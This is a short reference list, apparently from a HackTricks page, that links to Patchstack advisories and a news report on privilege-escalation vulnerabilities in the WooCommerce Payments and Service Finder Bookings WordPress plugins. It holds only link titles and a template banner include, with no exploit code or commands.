- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
